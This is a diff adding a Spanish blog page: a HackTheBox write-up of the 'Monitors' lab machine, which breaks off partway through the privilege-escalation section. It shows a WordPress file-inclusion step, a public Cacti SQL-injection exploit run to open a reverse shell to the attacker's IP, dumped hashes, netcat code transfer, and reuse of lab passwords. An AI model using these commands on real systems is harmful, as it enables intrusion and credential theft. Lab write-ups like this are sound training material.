@@ -1,0 +1,369 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="">
+  <head>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>Monitors HTB Writeup - </title><meta name="author" content="">
+<meta name="author-link" content="">
+<meta name="description" content="Monitors HTB Writeup - Hard Linux Machine from HackTheBox" /><meta name="keywords" content='linux, writeup, hard' /><meta itemprop="name" content="Monitors HTB Writeup">
+<meta itemprop="description" content="Monitors HTB Writeup - Hard Linux Machine from HackTheBox"><meta itemprop="datePublished" content="2021-10-11T12:40:00+02:00" />
+<meta itemprop="dateModified" content="2021-10-11T12:40:00+02:00" />
+<meta itemprop="wordCount" content="1193">
+<meta itemprop="keywords" content="linux,writeup,hard," /><meta property="og:title" content="Monitors HTB Writeup" />
+<meta property="og:description" content="Monitors HTB Writeup - Hard Linux Machine from HackTheBox" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/posts/monitors-htb/monitors-htb/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-10-11T12:40:00+02:00" />
+<meta property="article:modified_time" content="2021-10-11T12:40:00+02:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Monitors HTB Writeup"/>
+<meta name="twitter:description" content="Monitors HTB Writeup - Hard Linux Machine from HackTheBox"/>
+<meta name="application-name" content="rottenbytes">
+<meta name="apple-mobile-web-app-title" content="rottenbytes"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="/posts/monitors-htb/monitors-htb/" /><link rel="prev" href="/posts/remote-htb/remote-htb/" /><link rel="next" href="/posts/zeno-thm/zeno-thm/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "Monitors HTB Writeup",
+    "inLanguage": "",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "\/posts\/monitors-htb\/monitors-htb\/"
+    },"genre": "posts","keywords": "linux, writeup, hard","wordcount":  1193 ,
+    "url": "\/posts\/monitors-htb\/monitors-htb\/","datePublished": "2021-10-11T12:40:00+02:00","dateModified": "2021-10-11T12:40:00+02:00","publisher": {
+      "@type": "Organization",
+      "name": ""},"author": {
+        "@type": "Person",
+        "name": "rottenbytes"
+      },"description": "Monitors HTB Writeup - Hard Linux Machine from HackTheBox"
+  }
+  </script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title=""><span id="typeit-header-desktop" class="typeit"></span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/posts/"
+                
+                
+              ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/categories/"
+                
+                
+              ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/tags/"
+                
+                
+              ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item delimiter"></li><li class="menu-item theme-switch" title="Switch Theme">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title=""><span id="typeit-header-title-mobile" class="typeit"></span></a><span class="header-subtitle"></span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/categories/"
+                  
+                  
+                ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/tags/"
+                  
+                  
+                ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item menu-system">
+          <span class="menu-system-item theme-switch" title="Switch Theme"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
+      </ul>
+    </nav>
+  </div>
+</header><main class="container"><aside class="toc" id="toc-auto"><h2 class="toc-title">Contents&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content" id="toc-content-auto"></div></aside>
+
+  <aside class="aside-custom">
+    </aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>Monitors HTB Writeup</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><span class="author"><i class="fa-solid fa-user-circle" aria-hidden="true"></i>
+      rottenbytes</span></span>
+          <span class="post-category">included in <a href="/categories/writeups/"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> writeups</a>&ensp;<a href="/categories/htb/"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> htb</a></span></div>
+      <div class="post-meta-line"><span title="published on 2021-10-11 12:40:00"><i class="fa-regular fa-calendar-alt fa-fw me-1" aria-hidden="true"></i><time datetime="2021-10-11">2021-10-11</time></span>&nbsp;<span title="Updated on 2021-10-11 12:40:00"><i class="fa-regular fa-edit fa-fw me-1" aria-hidden="true"></i><time datetime="2021-10-11">2021-10-11</time></span>&nbsp;<span><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>1193 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>6 minutes</span>&nbsp;</div>
+    </div><div class="featured-image"><img loading="lazy" src="../assets/posts/monitors/monitors_card.png" srcset="/../assets/posts/monitors/monitors_card.png, ../assets/posts/monitors/monitors_card.png 1.5x, /../assets/posts/monitors/monitors_card.png 2x" sizes="auto" data-title="Monitors HTB Writeup - Hard Linux Machine from HackTheBox" data-alt="/../assets/posts/monitors/monitors_card.png" width="594" height="379" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>Contents</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#enumeración">Enumeración</a>
+      <ul>
+        <li><a href="#nmap">Nmap</a></li>
+        <li><a href="#enumeración-http---p-80-tcp">Enumeración HTTP - p. 80 (TCP)</a></li>
+      </ul>
+    </li>
+    <li><a href="#explotación">Explotación</a>
+      <ul>
+        <li><a href="#wordpress">Wordpress</a></li>
+        <li><a href="#cacti">Cacti</a></li>
+        <li><a href="#usertxt">user.txt</a></li>
+      </ul>
+    </li>
+    <li><a href="#priv-esc">Priv. Esc.</a>
+      <ul>
+        <li><a href="#roottxt">root.txt</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content"><h2 id="enumeración">Enumeración</h2>
+<h3 id="nmap">Nmap</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">PORT STATE SERVICE VERSION  
+22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>  
+| ssh-hostkey:  
+| <span style="color:#ae81ff">2048</span> ba:cc:cd:81:fc:91:55:f3:f6:a9:1f:4e:e8:be:e5:2e <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>  
+| <span style="color:#ae81ff">256</span> 69:43:37:6a:18:09:f5:e7:7a:67:b8:18:11:ea:d7:65 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>  
+|_ <span style="color:#ae81ff">256</span> 5d:5e:3f:67:ef:7d:76:23:15:11:4b:53:f8:41:3a:94 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>  
+80/tcp open http Apache httpd 2.4.29 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>  
+|_http-server-header: Apache/2.4.29 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>  
+|_http-title: Site doesn<span style="color:#960050;background-color:#1e0010">&#39;</span>t have a title <span style="color:#f92672">(</span>text/html; charset<span style="color:#f92672">=</span>iso-8859-1<span style="color:#f92672">)</span>.  
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre></div><p>Esta máquina solo tiene dos puertos abiertos. Como no tenemos credenciales ni forma de acceder por SSH, lo único que podemos hacer es empezar a enumerar el puerto 80, que está ejecutando un Apache 2.4.29.</p>
+<h3 id="enumeración-http---p-80-tcp">Enumeración HTTP - p. 80 (TCP)</h3>
+<p><img loading="lazy" src="../assets/posts/monitors/vhost.png" srcset="/../assets/posts/monitors/vhost.png, ../assets/posts/monitors/vhost.png 1.5x, /../assets/posts/monitors/vhost.png 2x" sizes="auto" data-title="/../assets/posts/monitors/vhost.png" data-alt="/../assets/posts/monitors/vhost.png" width="974" height="171" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<p>Cuando intentamos acceder a la página, nos dice que el acceso directo por IP no está permitido, lo que nos hace pensar que se está aplicando &ldquo;Virtual Hosting&rdquo;. Podemos agregar el dominio a /etc/hosts para intentar visualizar la página.</p>
+<p><img loading="lazy" src="../assets/posts/monitors/web.png" srcset="/../assets/posts/monitors/web.png, ../assets/posts/monitors/web.png 1.5x, /../assets/posts/monitors/web.png 2x" sizes="auto" data-title="/../assets/posts/monitors/web.png" data-alt="/../assets/posts/monitors/web.png" width="1597" height="789" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<p>Al acceder a ella, podemos ver que es un sitio de WordPress. Podemos utilizar wpscan para tratar de enumerarla e intentar obtener algo de información.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#f92672">[</span>i<span style="color:#f92672">]</span> Plugin<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span> Identified:
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> wp-with-spritz
+ | Location: http://monitors.htb/wp-content/plugins/wp-with-spritz/
+ | Latest Version: 1.0 <span style="color:#f92672">(</span>up to date<span style="color:#f92672">)</span>
+ | Last Updated: 2015-08-20T20:15:00.000Z
+ |
+ | Found By: Urls In Homepage <span style="color:#f92672">(</span>Passive Detection<span style="color:#f92672">)</span>
+ |
+ | Version: 4.2.4 <span style="color:#f92672">(</span>80% confidence<span style="color:#f92672">)</span>
+ | Found By: Readme - Stable Tag <span style="color:#f92672">(</span>Aggressive Detection<span style="color:#f92672">)</span>
+ |  - http://monitors.htb/wp-content/plugins/wp-with-spritz/readme.txt
+</code></pre></div><h2 id="explotación">Explotación</h2>
+<h3 id="wordpress">Wordpress</h3>
+<p>Mediante wpscan podemos enumerar el plugin <code>wp-with-spritz v.1.0</code>, el cuál tiene asociada la siguiente vulnerabilidad asociada: <a href="https://www.exploit-db.com/exploits/44544"target="_blank" rel="external nofollow noopener noreferrer">WordPress Plugin WP with Spritz 1.0 - Remote File Inclusion</a>.</p>
+<p><img loading="lazy" src="../assets/posts/monitors/lfi.png" srcset="/../assets/posts/monitors/lfi.png, ../assets/posts/monitors/lfi.png 1.5x, /../assets/posts/monitors/lfi.png 2x" sizes="auto" data-title="/../assets/posts/monitors/lfi.png" data-alt="/../assets/posts/monitors/lfi.png" width="1919" height="218" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<p>Podemos tratar de ver el archivo <code>wp-config.php</code> para obtener las credenciales y probar si se están reutilizando para conectarnos por <em>SSH</em> o a través del panel de login de <em>Wordpress</em>, pero no parece ser reutilizada por estos servicios.</p>
+<p><img loading="lazy" src="../assets/posts/monitors/wpconfig.png" srcset="/../assets/posts/monitors/wpconfig.png, ../assets/posts/monitors/wpconfig.png 1.5x, /../assets/posts/monitors/wpconfig.png 2x" sizes="auto" data-title="/../assets/posts/monitors/wpconfig.png" data-alt="/../assets/posts/monitors/wpconfig.png" width="1154" height="245" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<p>Fuzzeamos el parámetro la siguiente <a href="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt"target="_blank" rel="external nofollow noopener noreferrer">wordlist</a>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">$ ffuf -c -u http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url<span style="color:#f92672">=</span>FUZZ -w file_inclusion_linux.txt -fs <span style="color:#ae81ff">0</span> -fw <span style="color:#ae81ff">1</span> | grep etc | grep -v passwd
+
+...snip...
+/etc/apache2/sites-enabled/000-default.conf <span style="color:#f92672">[</span>Status: 200, Size: 1633, Words: 205, Lines: 38<span style="color:#f92672">]</span>
+...snip...
+</code></pre></div><p><img loading="lazy" src="../assets/posts/monitors/defaultconf.png" srcset="/../assets/posts/monitors/defaultconf.png, ../assets/posts/monitors/defaultconf.png 1.5x, /../assets/posts/monitors/defaultconf.png 2x" sizes="auto" data-title="/../assets/posts/monitors/defaultconf.png" data-alt="/../assets/posts/monitors/defaultconf.png" width="1455" height="106" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<p>Añado el hostname a <code>/etc/hosts</code> y accedo a él para ver de qué se trata.</p>
+<h3 id="cacti">Cacti</h3>
+<p><img loading="lazy" src="../assets/posts/monitors/cactipanel.png" srcset="/../assets/posts/monitors/cactipanel.png, ../assets/posts/monitors/cactipanel.png 1.5x, /../assets/posts/monitors/cactipanel.png 2x" sizes="auto" data-title="/../assets/posts/monitors/cactipanel.png" data-alt="/../assets/posts/monitors/cactipanel.png" width="1817" height="673" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<p>Se trata de Cacti v1.2.12, con la siguiente vulnerabilidad: <a href="https://www.exploit-db.com/exploits/49810"target="_blank" rel="external nofollow noopener noreferrer">Cacti 1.2.12 - &lsquo;filter&rsquo; SQL Injection / Remote Code Execution</a>. Esta vulnerabilidad requiere de estar autenticado, por lo que al introducir la contraseña obtenida del fichero <code>wp-config</code> y el usuario <code>admin</code>, obtenemos acceso.</p>
+<h3 id="usertxt">user.txt</h3>
+<p>Ejecutando el exploit obtenemos una reverse shell y conseguimos acceso.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">$ python3 49810.py -t http://cacti-admin.monitors.htb -u admin -p BestAdministrator@2020! --lhost 10.10.14.44 --lport <span style="color:#ae81ff">9001</span>
+
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Connecting to the server...
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Retrieving CSRF token...
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Got CSRF token: sid:6ec5e442643970b8af40d1655bee6ea53965ac41,1633945902
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Trying to log in...
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Successfully logged in!
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> SQL Injection:
+<span style="color:#e6db74">&#34;name&#34;</span>,<span style="color:#e6db74">&#34;hex&#34;</span>
+<span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#e6db74">&#34;&#34;</span>
+<span style="color:#e6db74">&#34;admin&#34;</span>,<span style="color:#e6db74">&#34;</span>$2<span style="color:#e6db74">y</span>$10$TycpbAes3hYvzsbRxUEbc<span style="color:#e6db74">.dTqT0MdgVipJNBYu8b7rUlmB8zn8JwK&#34;</span>
+<span style="color:#e6db74">&#34;guest&#34;</span>,<span style="color:#e6db74">&#34;43e9a4ab75570f5b&#34;</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Check your nc listener!
+</code></pre></div><p>Abrimos un puerto a la escucha antes de lanzar el exploit y una vez obtenida la conexión podemos ver que somos <code>www-data</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">www-data@monitors:/usr/share/cacti/cacti$ groups <span style="color:#f92672">&amp;&amp;</span> id
+www-data
+uid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span>
+</code></pre></div><p>Ya que la máquina no dispone de <code>curl</code> ni <code>wget</code>, podemos transferir <a href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS"target="_blank" rel="external nofollow noopener noreferrer">Linpeas</a> mediante netcat.</p>
+<ul>
+<li>Máquina víctima:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">www-data@monitors:/tmp$ which nc
+/bin/nc
+www-data@monitors:/tmp$ nc 10.10.14.44 <span style="color:#ae81ff">9002</span> &gt; lin.sh
+</code></pre></div><ul>
+<li>Máquina atacante:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">$ nc -lnvp <span style="color:#ae81ff">9002</span> &lt; linpeas.sh
+</code></pre></div><p>Linpeas no nos muestra nada interesante, así que toca enumerar la máquina manualmente.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">www-data@monitors:/$ cd /home/marcus/
+www-data@monitors:/home/marcus$
+www-data@monitors:/home/marcus$ ls -la
+total <span style="color:#ae81ff">40</span>
+drwxr-xr-x <span style="color:#ae81ff">5</span> marcus marcus <span style="color:#ae81ff">4096</span> Jan <span style="color:#ae81ff">25</span>  <span style="color:#ae81ff">2021</span> .
+drwxr-xr-x <span style="color:#ae81ff">3</span> root   root   <span style="color:#ae81ff">4096</span> Nov <span style="color:#ae81ff">10</span>  <span style="color:#ae81ff">2020</span> ..
+d--x--x--x <span style="color:#ae81ff">2</span> marcus marcus <span style="color:#ae81ff">4096</span> Nov <span style="color:#ae81ff">10</span>  <span style="color:#ae81ff">2020</span> .backup
+lrwxrwxrwx <span style="color:#ae81ff">1</span> root   root      <span style="color:#ae81ff">9</span> Nov <span style="color:#ae81ff">10</span>  <span style="color:#ae81ff">2020</span> .bash_history -&gt; /dev/null
+-rw-r--r-- <span style="color:#ae81ff">1</span> marcus marcus  <span style="color:#ae81ff">220</span> Apr  <span style="color:#ae81ff">4</span>  <span style="color:#ae81ff">2018</span> .bash_logout
+-rw-r--r-- <span style="color:#ae81ff">1</span> marcus marcus <span style="color:#ae81ff">3771</span> Apr  <span style="color:#ae81ff">4</span>  <span style="color:#ae81ff">2018</span> .bashrc
+drwx------ <span style="color:#ae81ff">2</span> marcus marcus <span style="color:#ae81ff">4096</span> Jan <span style="color:#ae81ff">25</span>  <span style="color:#ae81ff">2021</span> .cache
+drwx------ <span style="color:#ae81ff">3</span> marcus marcus <span style="color:#ae81ff">4096</span> Nov <span style="color:#ae81ff">10</span>  <span style="color:#ae81ff">2020</span> .gnupg
+-rw-r--r-- <span style="color:#ae81ff">1</span> marcus marcus  <span style="color:#ae81ff">807</span> Apr  <span style="color:#ae81ff">4</span>  <span style="color:#ae81ff">2018</span> .profile
+-r--r----- <span style="color:#ae81ff">1</span> root   marcus   <span style="color:#ae81ff">84</span> Jan <span style="color:#ae81ff">25</span>  <span style="color:#ae81ff">2021</span> note.txt
+-r--r----- <span style="color:#ae81ff">1</span> root   marcus   <span style="color:#ae81ff">33</span> Oct <span style="color:#ae81ff">11</span> 09:03 user.txt
+www-data@monitors:/home/marcus$ ls -la .backup/
+ls: cannot open directory <span style="color:#e6db74">&#39;.backup/&#39;</span>: Permission denied
+</code></pre></div><p>Observamos que el directorio <em>home</em> de <code>marcus</code> hay un directorio oculto llamado <code>.backup</code>. Podemos buscar en la máquina algún otro fichero que tenga relación mediante un <code>grep</code> recursivo.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">www-data@monitors:/$ grep -R <span style="color:#e6db74">&#39;backup&#39;</span> /etc 2&gt;/dev/null | grep marcus
+/etc/systemd/system/cacti-backup.service:ExecStart<span style="color:#f92672">=</span>/home/marcus/.backup/backup.sh
+www-data@monitors:/home/marcus$ cat /home/marcus/.backup/backup.sh
+ <span style="color:#75715e">#!/bin/bash</span>
+ backup_name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;cacti_backup&#34;</span>  
+ config_pass<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;VerticalEdge2020&#34;</span>
+ zip /tmp/<span style="color:#e6db74">${</span>backup_name<span style="color:#e6db74">}</span>.zip /usr/share/cacti/cacti/*
+ sshpass -p <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>config_pass<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span> scp /tmp/<span style="color:#e6db74">${</span>backup_name<span style="color:#e6db74">}</span> 192.168.1.14:/opt/backup_collection/<span style="color:#e6db74">${</span>backup_name<span style="color:#e6db74">}</span>.zip
+ rm /tmp/<span style="color:#e6db74">${</span>backup_name<span style="color:#e6db74">}</span>.zip
+</code></pre></div><p>Encontramos el script <code>backup.sh</code>, el cuál contiene una contraseña en texto plano, por lo que podemos intentar acceder a través de <em>SSH</em> como el usuario <em>marcus</em>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">$ ssh marcus@monitors.htb
+marcus@monitors.htb<span style="color:#960050;background-color:#1e0010">&#39;</span>s password:
+Welcome to Ubuntu 18.04.5 LTS <span style="color:#f92672">(</span>GNU/Linux 4.15.0-151-generic x86_64<span style="color:#f92672">)</span>
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Mon Oct <span style="color:#ae81ff">11</span> 10:28:18 UTC <span style="color:#ae81ff">2021</span>
+
+  System load:  0.05               Users logged in:                <span style="color:#ae81ff">0</span>
+  Usage of /:   34.9% of 17.59GB   IP address <span style="color:#66d9ef">for</span> ens160:          10.10.10.238
+  Memory usage: 53%                IP address <span style="color:#66d9ef">for</span> docker0:         172.17.0.1
+  Swap usage:   0%                 IP address <span style="color:#66d9ef">for</span> br-968a1c1855aa: 172.18.0.1
+  Processes:    <span style="color:#ae81ff">213</span>
+...snip...
+
+marcus@monitors:~$ cat user.txt
+91e97fc293c123*******************
+</code></pre></div><h2 id="priv-esc">Priv. Esc.</h2>
+<h3 id="roottxt">root.txt</h3>
+<p>Dentro del directorio <em>home</em> de <code>marcus</code> se encuentra una nota, la cuál nos da una pista de que posiblemente estemos corriendo bajo un docker.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">marcus@monitors:~$ cat note.txt
+TODO:
+Disable phpinfo in php.ini - DONE
+Update docker image <span style="color:#66d9ef">for</span> production use - DONE
+</code></pre></div><p>Tratando de ver qué puertos tiene abiertos la máquina localmente conseguimos ver que el puerto <code>8443</code> está abierto.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">marcus@monitors:~$ netstat -antulp | grep LISTEN
+<span style="color:#f92672">(</span>Not all processes could be identified, non-owned process info will not be shown, you would have to be root to see it all.<span style="color:#f92672">)</span>
+tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 127.0.0.1:8443          0.0.0.0:*               LISTEN      -
+</code></pre></div><p>Tenemos acceso por <em>SSH</em> a la máquina por lo que podemos crear un túnel desde nuestra máquina para poder ver qué se está ejecutando en ese puerto.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">$ ssh -L 8443:127.0.0.1:8443 marcus@10.10.10.238
+</code></pre></div><p><img loading="lazy" src="../assets/posts/monitors/tunel.png" srcset="/../assets/posts/monitors/tunel.png, ../assets/posts/monitors/tunel.png 1.5x, /../assets/posts/monitors/tunel.png 2x" sizes="auto" data-title="/../assets/posts/monitors/tunel.png" data-alt="/../assets/posts/monitors/tunel.png" width="1365" height="253" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<p>Está corriendo un <em>Apache Tomcat v.9.0.31</em>.
+<code>Nikto</code> encuentra que se trata de <code>OFBiz</code>, el cuál tiene una vulnerabidad de deserialization: <a href="https://www.rapid7.com/db/modules/exploit/linux/http/apache_ofbiz_deserialization/"target="_blank" rel="external nofollow noopener noreferrer">Apache OFBiz XML-RPC Java Deserialization</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">$ nikto -h https://localhost:8443
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          127.0.0.1
++ Target Hostname:    localhost
++ Target Port:        <span style="color:#ae81ff">8443</span>
+---------------------------------------------------------------------------
+
